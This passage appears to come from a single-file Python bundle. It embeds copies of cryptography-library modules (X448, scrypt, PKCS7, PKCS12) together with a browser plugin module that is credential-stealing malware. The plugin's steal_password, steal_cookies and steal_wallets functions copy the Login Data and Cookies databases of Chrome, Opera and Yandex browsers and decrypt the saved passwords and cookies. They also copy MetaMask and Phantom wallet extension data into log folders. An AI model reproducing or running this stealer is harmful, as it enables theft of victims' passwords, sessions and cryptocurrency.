encoding, format, encryption_algorithm, self, self._evp_pkey, None\r\n        )\r\n\r\n    def _raw_private_bytes(self) -> bytes:\r\n        # When we drop support for CRYPTOGRAPHY_OPENSSL_LESS_THAN_111 we can\r\n        # switch this to EVP_PKEY_new_raw_private_key\r\n        # The trick we use here is serializing to a PKCS8 key and just\r\n        # using the last 32 bytes, which is the key itself.\r\n        bio = self._backend._create_mem_bio_gc()\r\n        res = self._backend._lib.i2d_PKCS8PrivateKey_bio(\r\n            bio,\r\n            self._evp_pkey,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n            0,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        pkcs8 = self._backend._read_mem_bio(bio)\r\n        self._backend.openssl_assert(len(pkcs8) == 48)\r\n        return pkcs8[-_X25519_KEY_SIZE:]\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/x448.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography.hazmat.backends.openssl.utils import _evp_pkey_derive\r\nfrom cryptography.hazmat.primitives import serialization\r\nfrom cryptography.hazmat.primitives.asymmetric.x448 import (\r\n    X448PrivateKey,\r\n    X448PublicKey,\r\n)\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.backends.openssl.backend import Backend\r\n\r\n_X448_KEY_SIZE = 56\r\n\r\n\r\nclass _X448PublicKey(X448PublicKey):\r\n    def __init__(self, backend: "Backend", evp_pkey):\r\n        self._backend = backend\r\n        self._evp_pkey = evp_pkey\r\n\r\n    def public_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PublicFormat,\r\n    ) -> bytes:\r\n        if (\r\n            encoding is serialization.Encoding.Raw\r\n            or format is serialization.PublicFormat.Raw\r\n        ):\r\n            if (\r\n                encoding is not serialization.Encoding.Raw\r\n                or format is not serialization.PublicFormat.Raw\r\n            ):\r\n                raise ValueError(\r\n                    "When using Raw both encoding and format must be Raw"\r\n                )\r\n\r\n            return self._raw_public_bytes()\r\n\r\n        return self._backend._public_key_bytes(\r\n            encoding, format, self, self._evp_pkey, None\r\n        )\r\n\r\n    def _raw_public_bytes(self) -> bytes:\r\n        buf = self._backend._ffi.new("unsigned char []", _X448_KEY_SIZE)\r\n        buflen = self._backend._ffi.new("size_t *", _X448_KEY_SIZE)\r\n        res = self._backend._lib.EVP_PKEY_get_raw_public_key(\r\n            self._evp_pkey, buf, buflen\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        self._backend.openssl_assert(buflen[0] == _X448_KEY_SIZE)\r\n        return self._backend._ffi.buffer(buf, _X448_KEY_SIZE)[:]\r\n\r\n\r\nclass _X448PrivateKey(X448PrivateKey):\r\n    def __init__(self, backend: "Backend", evp_pkey):\r\n        self._backend = backend\r\n        self._evp_pkey = evp_pkey\r\n\r\n    def public_key(self) -> X448PublicKey:\r\n        buf = self._backend._ffi.new("unsigned char []", _X448_KEY_SIZE)\r\n        buflen = self._backend._ffi.new("size_t *", _X448_KEY_SIZE)\r\n        res = self._backend._lib.EVP_PKEY_get_raw_public_key(\r\n            self._evp_pkey, buf, buflen\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        self._backend.openssl_assert(buflen[0] == _X448_KEY_SIZE)\r\n        public_bytes = self._backend._ffi.buffer(buf)[:]\r\n        return self._backend.x448_load_public_bytes(public_bytes)\r\n\r\n    def exchange(self, peer_public_key: X448PublicKey) -> bytes:\r\n        if not isinstance(peer_public_key, X448PublicKey):\r\n            raise TypeError("peer_public_key must be X448PublicKey.")\r\n\r\n        return _evp_pkey_derive(self._backend, self._evp_pkey, peer_public_key)\r\n\r\n    def private_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PrivateFormat,\r\n        encryption_algorithm: serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        if (\r\n            encoding is serialization.Encoding.Raw\r\n            or format is serialization.PublicFormat.Raw\r\n        ):\r\n            if (\r\n                format is not serialization.PrivateFormat.Raw\r\n                or encoding is not serialization.Encoding.Raw\r\n                or not isinstance(\r\n                    encryption_algorithm, serialization.NoEncryption\r\n                )\r\n            ):\r\n                raise ValueError(\r\n                    "When using Raw both encoding and format must be Raw "\r\n                    "and encryption_algorithm must be NoEncryption()"\r\n                )\r\n\r\n            return self._raw_private_bytes()\r\n\r\n        return self._backend._private_key_bytes(\r\n            encoding, format, encryption_algorithm, self, self._evp_pkey, None\r\n        )\r\n\r\n    def _raw_private_bytes(self) -> bytes:\r\n        buf = self._backend._ffi.new("unsigned char []", _X448_KEY_SIZE)\r\n        buflen = self._backend._ffi.new("size_t *", _X448_KEY_SIZE)\r\n        res = self._backend._lib.EVP_PKEY_get_raw_private_key(\r\n            self._evp_pkey, buf, buflen\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        self._backend.openssl_assert(buflen[0] == _X448_KEY_SIZE)\r\n        return self._backend._ffi.buffer(buf, _X448_KEY_SIZE)[:]\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/kdf/__init__.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\n\r\n\r\nclass KeyDerivationFunction(metaclass=abc.ABCMeta):\r\n    @abc.abstractmethod\r\n    def derive(self, key_material: bytes) -> bytes:\r\n        """\r\n        Deterministically generates and returns a new key based on the existing\r\n        key material.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def verify(self, key_material: bytes, expected_key: bytes) -> None:\r\n        """\r\n        Checks whether the key generated by the key material matches the\r\n        expected derived key. Raises an exception if they do not match.\r\n        """\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/kdf/scrypt.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport sys\r\nimport typing\r\n\r\nfrom cryptography import utils\r\nfrom cryptography.exceptions import (\r\n    AlreadyFinalized,\r\n    InvalidKey,\r\n    UnsupportedAlgorithm,\r\n)\r\nfrom cryptography.hazmat.primitives import constant_time\r\nfrom cryptography.hazmat.primitives.kdf import KeyDerivationFunction\r\n\r\n\r\n# This is used by the scrypt tests to skip tests that require more memory\r\n# than the MEM_LIMIT\r\n_MEM_LIMIT = sys.maxsize // 2\r\n\r\n\r\nclass Scrypt(KeyDerivationFunction):\r\n    def __init__(\r\n        self,\r\n        salt: bytes,\r\n        length: int,\r\n        n: int,\r\n        r: int,\r\n        p: int,\r\n        backend: typing.Any = None,\r\n    ):\r\n        from cryptography.hazmat.backends.openssl.backend import (\r\n            backend as ossl,\r\n        )\r\n\r\n        if not ossl.scrypt_supported():\r\n            raise UnsupportedAlgorithm(\r\n                "This version of OpenSSL does not support scrypt"\r\n            )\r\n        self._length = length\r\n        utils._check_bytes("salt", salt)\r\n        if n < 2 or (n & (n - 1)) != 0:\r\n            raise ValueError("n must be greater than 1 and be a power of 2.")\r\n\r\n        if r < 1:\r\n            raise ValueError("r must be greater than or equal to 1.")\r\n\r\n        if p < 1:\r\n            raise ValueError("p must be greater than or equal to 1.")\r\n\r\n        self._used = False\r\n        self._salt = salt\r\n        self._n = n\r\n        self._r = r\r\n        self._p = p\r\n\r\n    def derive(self, key_material: bytes) -> bytes:\r\n        if self._used:\r\n            raise AlreadyFinalized("Scrypt instances can only be used once.")\r\n        self._used = True\r\n\r\n        utils._check_byteslike("key_material", key_material)\r\n        from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n        return backend.derive_scrypt(\r\n            key_material, self._salt, self._length, self._n, self._r, self._p\r\n        )\r\n\r\n    def verify(self, key_material: bytes, expected_key: bytes) -> None:\r\n        derived_key = self.derive(key_material)\r\n        if not constant_time.bytes_eq(derived_key, expected_key):\r\n            raise InvalidKey("Keys do not match.")\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/serialization/pkcs7.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography import utils\r\nfrom cryptography import x509\r\nfrom cryptography.hazmat.primitives import hashes, serialization\r\nfrom cryptography.hazmat.primitives.asymmetric import ec, rsa\r\nfrom cryptography.utils import _check_byteslike\r\n\r\n\r\ndef load_pem_pkcs7_certificates(data: bytes) -> typing.List[x509.Certificate]:\r\n    from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n    return backend.load_pem_pkcs7_certificates(data)\r\n\r\n\r\ndef load_der_pkcs7_certificates(data: bytes) -> typing.List[x509.Certificate]:\r\n    from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n    return backend.load_der_pkcs7_certificates(data)\r\n\r\n\r\ndef serialize_certificates(\r\n    certs: typing.List[x509.Certificate],\r\n    encoding: serialization.Encoding,\r\n) -> bytes:\r\n    from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n    return backend.pkcs7_serialize_certificates(certs, encoding)\r\n\r\n\r\n_ALLOWED_PKCS7_HASH_TYPES = typing.Union[\r\n    hashes.SHA1,\r\n    hashes.SHA224,\r\n    hashes.SHA256,\r\n    hashes.SHA384,\r\n    hashes.SHA512,\r\n]\r\n\r\n_ALLOWED_PRIVATE_KEY_TYPES = typing.Union[\r\n    rsa.RSAPrivateKey, ec.EllipticCurvePrivateKey\r\n]\r\n\r\n\r\nclass PKCS7Options(utils.Enum):\r\n    Text = "Add text/plain MIME type"\r\n    Binary = "Don\'t translate input data into canonical MIME format"\r\n    DetachedSignature = "Don\'t embed data in the PKCS7 structure"\r\n    NoCapabilities = "Don\'t embed SMIME capabilities"\r\n    NoAttributes = "Don\'t embed authenticatedAttributes"\r\n    NoCerts = "Don\'t embed signer certificate"\r\n\r\n\r\nclass PKCS7SignatureBuilder:\r\n    def __init__(\r\n        self,\r\n        data: typing.Optional[bytes] = None,\r\n        signers: typing.List[\r\n            typing.Tuple[\r\n                x509.Certificate,\r\n                _ALLOWED_PRIVATE_KEY_TYPES,\r\n                _ALLOWED_PKCS7_HASH_TYPES,\r\n            ]\r\n        ] = [],\r\n        additional_certs: typing.List[x509.Certificate] = [],\r\n    ):\r\n        self._data = data\r\n        self._signers = signers\r\n        self._additional_certs = additional_certs\r\n\r\n    def set_data(self, data: bytes) -> "PKCS7SignatureBuilder":\r\n        _check_byteslike("data", data)\r\n        if self._data is not None:\r\n            raise ValueError("data may only be set once")\r\n\r\n        return PKCS7SignatureBuilder(data, self._signers)\r\n\r\n    def add_signer(\r\n        self,\r\n        certificate: x509.Certificate,\r\n        private_key: _ALLOWED_PRIVATE_KEY_TYPES,\r\n        hash_algorithm: _ALLOWED_PKCS7_HASH_TYPES,\r\n    ) -> "PKCS7SignatureBuilder":\r\n        if not isinstance(\r\n            hash_algorithm,\r\n            (\r\n                hashes.SHA1,\r\n                hashes.SHA224,\r\n                hashes.SHA256,\r\n                hashes.SHA384,\r\n                hashes.SHA512,\r\n            ),\r\n        ):\r\n            raise TypeError(\r\n                "hash_algorithm must be one of hashes.SHA1, SHA224, "\r\n                "SHA256, SHA384, or SHA512"\r\n            )\r\n        if not isinstance(certificate, x509.Certificate):\r\n            raise TypeError("certificate must be a x509.Certificate")\r\n\r\n        if not isinstance(\r\n            private_key, (rsa.RSAPrivateKey, ec.EllipticCurvePrivateKey)\r\n        ):\r\n            raise TypeError("Only RSA & EC keys are supported at this time.")\r\n\r\n        return PKCS7SignatureBuilder(\r\n            self._data,\r\n            self._signers + [(certificate, private_key, hash_algorithm)],\r\n        )\r\n\r\n    def add_certificate(\r\n        self, certificate: x509.Certificate\r\n    ) -> "PKCS7SignatureBuilder":\r\n        if not isinstance(certificate, x509.Certificate):\r\n            raise TypeError("certificate must be a x509.Certificate")\r\n\r\n        return PKCS7SignatureBuilder(\r\n            self._data, self._signers, self._additional_certs + [certificate]\r\n        )\r\n\r\n    def sign(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        options: typing.Iterable[PKCS7Options],\r\n        backend: typing.Any = None,\r\n    ) -> bytes:\r\n        if len(self._signers) == 0:\r\n            raise ValueError("Must have at least one signer")\r\n        if self._data is None:\r\n            raise ValueError("You must add data to sign")\r\n        options = list(options)\r\n        if not all(isinstance(x, PKCS7Options) for x in options):\r\n            raise ValueError("options must be from the PKCS7Options enum")\r\n        if encoding not in (\r\n            serialization.Encoding.PEM,\r\n            serialization.Encoding.DER,\r\n            serialization.Encoding.SMIME,\r\n        ):\r\n            raise ValueError(\r\n                "Must be PEM, DER, or SMIME from the Encoding enum"\r\n            )\r\n\r\n        # Text is a meaningless option unless it is accompanied by\r\n        # DetachedSignature\r\n        if (\r\n            PKCS7Options.Text in options\r\n            and PKCS7Options.DetachedSignature not in options\r\n        ):\r\n            raise ValueError(\r\n                "When passing the Text option you must also pass "\r\n                "DetachedSignature"\r\n            )\r\n\r\n        if PKCS7Options.Text in options and encoding in (\r\n            serialization.Encoding.DER,\r\n            serialization.Encoding.PEM,\r\n        ):\r\n            raise ValueError(\r\n                "The Text option is only available for SMIME serialization"\r\n            )\r\n\r\n        # No attributes implies no capabilities so we\'ll error if you try to\r\n        # pass both.\r\n        if (\r\n            PKCS7Options.NoAttributes in options\r\n            and PKCS7Options.NoCapabilities in options\r\n        ):\r\n            raise ValueError(\r\n                "NoAttributes is a superset of NoCapabilities. Do not pass "\r\n                "both values."\r\n            )\r\n\r\n        from cryptography.hazmat.backends.openssl.backend import (\r\n            backend as ossl,\r\n        )\r\n\r\n        return ossl.pkcs7_sign(self, encoding, options)\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/serialization/pkcs12.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography import x509\r\nfrom cryptography.hazmat.primitives import serialization\r\nfrom cryptography.hazmat.primitives.asymmetric import (\r\n    dsa,\r\n    ec,\r\n    ed25519,\r\n    ed448,\r\n    rsa,\r\n)\r\nfrom cryptography.hazmat.primitives.asymmetric.types import (\r\n    PRIVATE_KEY_TYPES,\r\n)\r\n\r\n\r\n_ALLOWED_PKCS12_TYPES = typing.Union[\r\n    rsa.RSAPrivateKey,\r\n    dsa.DSAPrivateKey,\r\n    ec.EllipticCurvePrivateKey,\r\n    ed25519.Ed25519PrivateKey,\r\n    ed448.Ed448PrivateKey,\r\n]\r\n\r\n\r\nclass PKCS12Certificate:\r\n    def __init__(\r\n        self,\r\n        cert: x509.Certificate,\r\n        friendly_name: typing.Optional[bytes],\r\n    ):\r\n        if not isinstance(cert, x509.Certificate):\r\n            raise TypeError("Expecting x509.Certificate object")\r\n        if friendly_name is not None and not isinstance(friendly_name, bytes):\r\n            raise TypeError("friendly_name must be bytes or None")\r\n        self._cert = cert\r\n        self._friendly_name = friendly_name\r\n\r\n    @property\r\n    def friendly_name(self) -> typing.Optional[bytes]:\r\n        return self._friendly_name\r\n\r\n    @property\r\n    def certificate(self) -> x509.Certificate:\r\n        return self._cert\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, PKCS12Certificate):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.certificate == other.certificate\r\n            and self.friendly_name == other.friendly_name\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        return hash((self.certificate, self.friendly_name))\r\n\r\n    def __repr__(self) -> str:\r\n        return "<PKCS12Certificate({}, friendly_name={!r})>".format(\r\n            self.certificate, self.friendly_name\r\n        )\r\n\r\n\r\nclass PKCS12KeyAndCertificates:\r\n    def __init__(\r\n        self,\r\n        key: typing.Optional[PRIVATE_KEY_TYPES],\r\n        cert: typing.Optional[PKCS12Certificate],\r\n        additional_certs: typing.List[PKCS12Certificate],\r\n    ):\r\n        if key is not None and not isinstance(\r\n            key,\r\n            (\r\n                rsa.RSAPrivateKey,\r\n                dsa.DSAPrivateKey,\r\n                ec.EllipticCurvePrivateKey,\r\n                ed25519.Ed25519PrivateKey,\r\n                ed448.Ed448PrivateKey,\r\n            ),\r\n        ):\r\n            raise TypeError(\r\n                "Key must be RSA, DSA, EllipticCurve, ED25519, or ED448"\r\n                " private key, or None."\r\n            )\r\n        if cert is not None and not isinstance(cert, PKCS12Certificate):\r\n            raise TypeError("cert must be a PKCS12Certificate object or None")\r\n        if not all(\r\n            isinstance(add_cert, PKCS12Certificate)\r\n            for add_cert in additional_certs\r\n        ):\r\n            raise TypeError(\r\n                "all values in additional_certs must be PKCS12Certificate"\r\n                " objects"\r\n            )\r\n        self._key = key\r\n        self._cert = cert\r\n        self._additional_certs = additional_certs\r\n\r\n    @property\r\n    def key(self) -> typing.Optional[PRIVATE_KEY_TYPES]:\r\n        return self._key\r\n\r\n    @property\r\n    def cert(self) -> typing.Optional[PKCS12Certificate]:\r\n        return self._cert\r\n\r\n    @property\r\n    def additional_certs(self) -> typing.List[PKCS12Certificate]:\r\n        return self._additional_certs\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, PKCS12KeyAndCertificates):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.key == other.key\r\n            and self.cert == other.cert\r\n            and self.additional_certs == other.additional_certs\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        return hash((self.key, self.cert, tuple(self.additional_certs)))\r\n\r\n    def __repr__(self) -> str:\r\n        fmt = (\r\n            "<PKCS12KeyAndCertificates(key={}, cert={}, additional_certs={})>"\r\n        )\r\n        return fmt.format(self.key, self.cert, self.additional_certs)\r\n\r\n\r\ndef load_key_and_certificates(\r\n    data: bytes,\r\n    password: typing.Optional[bytes],\r\n    backend: typing.Any = None,\r\n) -> typing.Tuple[\r\n    typing.Optional[PRIVATE_KEY_TYPES],\r\n    typing.Optional[x509.Certificate],\r\n    typing.List[x509.Certificate],\r\n]:\r\n    from cryptography.hazmat.backends.openssl.backend import backend as ossl\r\n\r\n    return ossl.load_key_and_certificates_from_pkcs12(data, password)\r\n\r\n\r\ndef load_pkcs12(\r\n    data: bytes,\r\n    password: typing.Optional[bytes],\r\n    backend: typing.Any = None,\r\n) -> PKCS12KeyAndCertificates:\r\n    from cryptography.hazmat.backends.openssl.backend import backend as ossl\r\n\r\n    return ossl.load_pkcs12(data, password)\r\n\r\n\r\n_PKCS12_CAS_TYPES = typing.Union[\r\n    x509.Certificate,\r\n    PKCS12Certificate,\r\n]\r\n\r\n\r\ndef serialize_key_and_certificates(\r\n    name: typing.Optional[bytes],\r\n    key: typing.Optional[_ALLOWED_PKCS12_TYPES],\r\n    cert: typing.Optional[x509.Certificate],\r\n    cas: typing.Optional[typing.Iterable[_PKCS12_CAS_TYPES]],\r\n    encryption_algorithm: serialization.KeySerializationEncryption,\r\n) -> bytes:\r\n    if key is not None and not isinstance(\r\n        key,\r\n        (\r\n            rsa.RSAPrivateKey,\r\n            dsa.DSAPrivateKey,\r\n            ec.EllipticCurvePrivateKey,\r\n            ed25519.Ed25519PrivateKey,\r\n            ed448.Ed448PrivateKey,\r\n        ),\r\n    ):\r\n        raise TypeError(\r\n            "Key must be RSA, DSA, EllipticCurve, ED25519, or ED448"\r\n            " private key, or None."\r\n        )\r\n    if cert is not None and not isinstance(cert, x509.Certificate):\r\n        raise TypeError("cert must be a certificate or None")\r\n\r\n    if cas is not None:\r\n        cas = list(cas)\r\n        if not all(\r\n            isinstance(\r\n                val,\r\n                (\r\n                    x509.Certificate,\r\n                    PKCS12Certificate,\r\n                ),\r\n            )\r\n            for val in cas\r\n        ):\r\n            raise TypeError("all values in cas must be certificates")\r\n\r\n    if not isinstance(\r\n        encryption_algorithm, serialization.KeySerializationEncryption\r\n    ):\r\n        raise TypeError(\r\n            "Key encryption algorithm must be a "\r\n            "KeySerializationEncryption instance"\r\n        )\r\n\r\n    if key is None and cert is None and not cas:\r\n        raise ValueError("You must supply at least one of key, cert, or cas")\r\n\r\n    from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n    return backend.serialize_key_and_certificates_to_pkcs12(\r\n        name, key, cert, cas, encryption_algorithm\r\n    )\r\n')
    __stickytape_write_module('plugins/browsers/Chromium.py', b"from asyncio import Task, create_task\r\nfrom typing import List\r\nfrom plugins import Plugin\r\nfrom config import Config\r\nfrom os import scandir, mkdir\r\nfrom os.path import join, isdir, isfile, split\r\nfrom tools import copyfile, copytree, _handle_task_result\r\nfrom path_search import search_paths\r\nimport aiosqlite\r\nfrom .decrypt import Decryptor\r\nfrom time import time\r\nfrom paths import TEMP\r\nfrom secrets import token_hex\r\nfrom aiofiles import open\r\n\r\n\r\n\r\nclass Chromium(Plugin):\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n        self.decryptor = None\r\n\r\n\r\n    async def set_decryptor(self, root_path: str) -> None:\r\n        local_state_folders = {\r\n            join(root_path, 'user data'),\r\n            root_path\r\n        }\r\n\r\n        local_states = []\r\n        async for i in search_paths(local_state_folders, {'Local State'}):\r\n            local_states.append(i)\r\n\r\n        if local_states:\r\n            local_state_path = local_states[0]\r\n        else:\r\n            local_state_path = None\r\n\r\n        self.decryptor = Decryptor(local_state_path)\r\n\r\n\r\n    async def steal_password(self, root_path: str) -> None:\r\n        try:\r\n            rows = []\r\n\r\n            if not isdir(root_path):\r\n                return []\r\n\r\n            login_data_folder_paths = {\r\n                join(root_path, 'user data', 'default'),\r\n                root_path\r\n            }\r\n\r\n            async for p in search_paths(login_data_folder_paths, {'Login Data'}):\r\n                try:\r\n                    if not isfile(p):\r\n                        continue\r\n                    \r\n                    temp_path = join(TEMP, f'Login Data {time()}')\r\n                    await copyfile(p, temp_path)\r\n\r\n                    if not self.decryptor:\r\n                        await self.set_decryptor(root_path)\r\n                    async with aiosqlite.connect(temp_path) as conn:\r\n                        sql = 'select * from logins'\r\n                        async with conn.execute(sql) as curr:\r\n                            async for row in curr:\r\n                                try:\r\n                                    rows.append((row[1], row[3], self.decryptor.decrypt_password(row[5])))\r\n                                except Exception as e:\r\n                                    await self.conf.logger.log(f'\xd0\x9e\xd1\x88\xd0\xb8\xd0\xb1\xd0\xba\xd0\xb0 \xd0\xbf\xd1\x80\xd0\xb8 \xd0\xb4\xd0\xb5\xd0\xba\xd1\x80\xd0\xb8\xd0\xbf\xd1\x82\xd0\xb5 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8f, {e}')\r\n                except Exception as e:\r\n                    await self.conf.logger.log(f'\xd0\x9e\xd1\x88\xd0\xb8\xd0\xb1\xd0\xba\xd0\xb0 \xd0\xbf\xd1\x80\xd0\xb8 \xd0\xbf\xd0\xbe\xd0\xbf\xd1\x8b\xd1\x82\xd0\xba\xd0\xb5 \xd1\x81\xd0\xbf\xd0\xb8\xd0\xb7\xd0\xb4\xd0\xb8\xd1\x82\xd1\x8c \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd0\xb8 \xd1\x81 {p}, \xd0\xbe\xd1\x88\xd0\xb8\xd0\xb1\xd0\xba\xd0\xb0 {e}')\r\n\r\n            if rows:\r\n                name = f'{split(root_path)[1]}_{token_hex(5)}.txt'\r\n                passwords_path = join(self.conf.log_path, 'passwords')\r\n                path = join(passwords_path, name)\r\n\r\n                if not isdir(passwords_path):\r\n                    mkdir(passwords_path)\r\n\r\n                async with open(path, 'w', encoding='utf8') as f:\r\n                    for url, login, password in rows:\r\n                        await f.write(f'URL: {url}\\nLogin: {login}\\nPassword: {password}\\n\\n')\r\n\r\n                await self.conf.logger.log(f'\xd0\xa1\xd0\xbf\xd0\xb8\xd0\xb7\xd0\xb6\xd0\xb5\xd0\xbd\xd1\x8b \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd0\xb8 \xd1\x81 {root_path}')\r\n        except Exception as e:\r\n            await self.conf.logger.log(f'Error in steal_password: {e}')\r\n\r\n    async def steal_cookies(self, root_path: str) -> None:\r\n        try:\r\n            if not isdir(root_path):\r\n                return []\r\n\r\n            cookies = ''\r\n\r\n            cookie_folder_paths = {\r\n                join(root_path, 'user data', 'default', 'network'), \r\n                join(root_path, 'user data', 'default'),\r\n                root_path\r\n            }\r\n\r\n            async for p in search_paths(cookie_folder_paths, {'Cookies', 'cookies.sqlite'}):\r\n                if not isfile(p):\r\n                    continue\r\n\r\n                temp_path = join(TEMP, f'Cookies {time()}')\r\n                await copyfile(p, temp_path)\r\n\r\n                if not self.decryptor:\r\n                    await self.set_decryptor(root_path)\r\n                        \r\n                async with aiosqlite.connect(temp_path) as conn:\r\n                    sql = 'select * from cookies'\r\n                    async with conn.execute(sql) as curr:\r\n                        async for row in curr:\r\n                            conv = lambda x: 'TRUE' if x else 'FALSE'\r\n\r\n                            try:\r\n                                host = row[1]\r\n                                http_only = conv(row[9])\r\n                                path = row[6]\r\n                                secure = conv(row[8])\r\n                                expiration_date = str(row[7])\r\n                                name = row[3]\r\n                                value = self.decryptor.decrypt_password(row[5])\r\n                            except Exception as e:\r\n                                await self.conf.logger.log(f'\xd0\x9e\xd1\x88\xd0\xb8\xd0\xb1\xd0\xba\xd0\xb0 \xd0\xbf\xd1\x80\xd0\xb8 \xd0\xb4\xd0\xb5\xd0\xba\xd1\x80\xd0\xb8\xd0\xbf\xd1\x82\xd0\xb5 \xd0\xba\xd1\x83\xd0\xba\xd0\xb0, {e}')\r\n                            \r\n                            if not value:\r\n                                value = ''\r\n\r\n                            cookie = '\\t'.join(\r\n                                (host, http_only, path, secure, expiration_date, name, value))\r\n                            cookies += cookie + '\\n'\r\n\r\n            if cookies:\r\n                name = f'{split(root_path)[1]}_{token_hex(5)}.txt'\r\n                cookies_path = join(self.conf.log_path, 'cookies')\r\n                path = join(cookies_path, name)\r\n                \r\n                if not isdir(cookies_path):\r\n                    mkdir(cookies_path)\r\n\r\n                async with open(path, 'w', encoding='utf8') as f:\r\n                    await f.write(cookies)\r\n            \r\n                await self.conf.logger.log(f'\xd0\xa1\xd0\xbf\xd0\xb8\xd0\xb7\xd0\xb6\xd0\xb5\xd0\xbd\xd1\x8b \xd0\xba\xd1\x83\xd0\xba\xd0\xb8 \xd1\x81 {root_path}')\r\n        except Exception as e:\r\n            await self.conf.logger.log(f'Error in steal_cookies: {e}')\r\n\r\n\r\n    async def steal_wallets(self, root_path: str) -> None:\r\n        try:\r\n            if not isdir(root_path):\r\n                return []\r\n\r\n            wallet_folder_paths = {\r\n                join(root_path, 'user data', 'default', 'local extension settings'), \r\n                join(root_path, 'user data', 'local extension settings'), \r\n                join(root_path, 'local extension settings')\r\n            }\r\n\r\n            wallets = {\r\n                'nkbihfbeogaeaoehlefnkodbefgpgknn': 'metamask',\r\n                'bfnaelmomeimhlpmgjnjophhpkkoljpa': 'phantom'\r\n            }\r\n\r\n            async for p in search_paths(wallet_folder_paths, set(wallets.keys())):\r\n                if not isdir(p):\r\n                    continue\r\n                \r\n                wallets_path = join(self.conf.log_path, 'wallets')\r\n                if not isdir(wallets_path):\r\n                    mkdir(wallets_path)\r\n\r\n                name = split(p)[1]\r\n                wallet_name = wallets[name]\r\n                dest_path = join(wallets_path, f'{wallet_name}_{token_hex(4)}')\r\n\r\n                try:\r\n                    await copytree(p, dest_path)\r\n                except Exception as e:\r\n                    pass\r\n\r\n                await self.conf.logger.log(f'\xd0\xa1\xd0\xbf\xd0\xb8\xd0\xb7\xd0\xb6\xd0\xb5\xd0\xbd \xd0\xb2\xd0\xb5\xd0\xb1 \xd0\xba\xd0\xbe\xd1\x88\xd0\xb5\xd0\xbb\xd1\x8c \xd1\x81 {p}')\r\n        except Exception as e:\r\n            await self.conf.logger.log(f'\xd0\x9e\xd1\x88\xd0\xb8\xd0\xb1\xd0\xba\xd0\xb0 \xd0\xbf\xd1\x80\xd0\xb8 \xd0\xbf\xd0\xbe\xd0\xbf\xd1\x8b\xd1\x82\xd0\xba\xd0\xb5 \xd1\x81\xd0\xbf\xd0\xb8\xd0\xb7\xd0\xb4\xd0\xb8\xd1\x82\xd1\x8c \xd0\xb2\xd0\xb5\xd0\xb1 \xd0\xba\xd0\xbe\xd1\x88\xd0\xb5\xd0\xbb\xd0\xb5\xd0\xba {root_path}')\r\n    \r\n\r\n    async def callback(self, path: str) -> None:\r\n        chromium_browser_names = {\r\n            'opera gx stable',\r\n            'opera stable',\r\n            'chrome',\r\n            'yandexbrowser'\r\n        }\r\n\r\n        tasks: List[Task] = []\r\n\r\n        for folder_name in chromium_browser_names.intersection(i.name.lower() for i in scandir(path)):\r\n            root_path = join(path, folder_name)\r\n            tasks.append(create_task(self.steal_password(root_path)))\r\n            tasks.append(create_task(self.steal_cookies(root_path)))\r\n            tasks.append(create_task(self.steal_wallets(root_path)))\r\n\r\n        for task in tasks:\r\n            task.add_done_callback(lambda x: _handle_task_result(x, self.conf.logger))\r\n            \r\n        for task in tasks:\r\n            try:\r\n                await task\r\n            except Exception as e:\r\n                await self.conf.logger.log(f'Error in chromium tasks: {e}')\r\n                ")
